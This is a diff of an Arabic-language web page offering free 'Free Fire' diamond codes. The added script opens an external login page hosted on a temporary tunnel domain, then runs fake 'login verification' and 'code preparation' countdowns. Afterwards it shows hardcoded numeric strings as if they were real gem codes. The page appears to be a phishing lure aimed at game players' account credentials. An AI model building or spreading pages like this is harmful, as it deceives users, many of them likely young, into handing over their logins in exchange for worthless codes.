@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>💎 موقع شحن فري فاير 2026</title>
+<title>💎 موقع الشحن فري فاير 2026</title>
 
 <style>
 body{
@@ -39,7 +39,6 @@ body{
 .logo{
   width:100px;
   margin-top:10px;
-  filter: drop-shadow(0 0 15px #00eaff);
 }
 
 .container{
@@ -47,21 +46,16 @@ body{
   margin:40px auto;
   padding:30px;
   border-radius:30px;
-  background:rgba(0,0,0,0.8);
+  background:rgba(0,0,0,0.85);
   box-shadow:0 0 60px #00eaff;
   position:relative;
 }
 
 .game-logo{
   position:absolute;
-  top:10px;
-  right:10px;
+  top:15px;
+  right:15px;
   width:60px;
-}
-
-h1{
-  font-size:32px;
-  color:#ffd700;
 }
 
 button{
@@ -76,34 +70,139 @@ button{
   box-shadow:0 0 30px #fff;
 }
 
-#loginBtn{
-  background:#ff3c3c;
-  color:#fff;
-}
+#loginBtn{ background:#ff3c3c; color:#fff; }
+#codeBtn{ background:#00eaff; color:#000; }
+#refreshBtn{ background:#9b59ff; color:#fff; display:none; }
 
-#codeBtn{
-  background:#00eaff;
-  color:#000;
-}
-
-#diamond110Btn{
-  background:#ffd700;
-  color:#000;
-}
-
-button:hover{
-  transform:scale(1.1);
-}
-
-button:disabled{
-  opacity:0.5;
-  cursor:not-allowed;
-}
+button:hover{ transform:scale(1.1); }
+button:disabled{ opacity:0.5; cursor:not-allowed; }
 
 #codeBox{
   margin-top:25px;
-  font-size:26px;
+  font-size:28px;
   color:#00ffcc;
+  font-weight:bold;
+  text-shadow:0 0 15px #000;
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+🔥 موقع الشحن فري فاير 2026 🔥
+<br>
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+</div>
+
+<div class="container">
+  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+
+  <h1>💎 نظام أكواد الجواهر التلقائي</h1>
+  <p>قم بتسجيل الدخول ثم انتظر التحقق للحصول على كود الجواهر</p>
+
+  <button id="loginBtn">🔐 تسجيل دخول</button>
+  <br>
+
+  <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
+  <button id="refreshBtn">🔄 تحديث الكود</button>
+
+  <div id="codeBox"></div>
+</div>
+
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const codeBtn = document.getElementById("codeBtn");
+const refreshBtn = document.getElementById("refreshBtn");
+const codeBox = document.getElementById("codeBox");
+
+const codes = [
+"386855252454554",
+"252524242524244",
+"252524242424222",
+"252522222241222",
+"252522212242222",
+"252525222255283",
+"683825382425544",
+"383865242427242"
+];
+
+let index = 0;
+let logged = false;
+
+// عداد 35 ثانية تنازلي بعد تسجيل الدخول
+function loginCountdown(){
+  let seconds = 35;
+  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
+
+  const timer = setInterval(() => {
+    seconds--;
+    codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
+
+    if(seconds <= 0){
+      clearInterval(timer);
+      codeBtn.disabled = false;
+      codeBox.textContent = "✅ تم التحقق! يمكنك الآن الحصول على الكود";
+    }
+  }, 1000);
+}
+
+// تسجيل الدخول
+loginBtn.addEventListener("click", () => {
+  window.open("https://sword-grants-warnings-mixing.trycloudflare.com/login.html", "_blank");
+
+  logged = true;
+  codeBtn.disabled = true;
+  refreshBtn.style.display = "none";
+  codeBtn.style.display = "inline-block";
+
+  loginCountdown();
+});
+
+// عداد 20 ثانية قبل ظهور الكود
+function codeCountdown(callback){
+  let seconds = 20;
+  codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
+
+  const timer = setInterval(() => {
+    seconds--;
+    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
+
+    if(seconds <= 0){
+      clearInterval(timer);
+      callback();
+    }
+  }, 1000);
+}
+
+// زر الحصول على الكود
+codeBtn.addEventListener("click", () => {
+  if(!logged) return;
+
+  codeBtn.disabled = true;
+
+  codeCountdown(() => {
+    codeBox.textContent = "💎 كود الجواهر: " + codes[index];
+    index = (index + 1) % codes.length;
+
+    // إخفاء زر الكود بعد الاستخدام
+    codeBtn.style.display = "none";
+
+    // إظهار زر التحديث
+    refreshBtn.style.display = "inline-block";
+  });
+});
+
+// زر تحديث الكود
+refreshBtn.addEventListener("click", () => {
+  refreshBtn.style.display = "none";
+  codeBtn.style.display = "inline-block";
+  codeBtn.disabled = false;
+  codeBox.textContent = "🔄 تم تحديث النظام! اضغط للحصول على كود جديد";
+});
+</script>
+
+</body>
+</html>  color:#00ffcc;
   font-weight:bold;
 }
 </style>
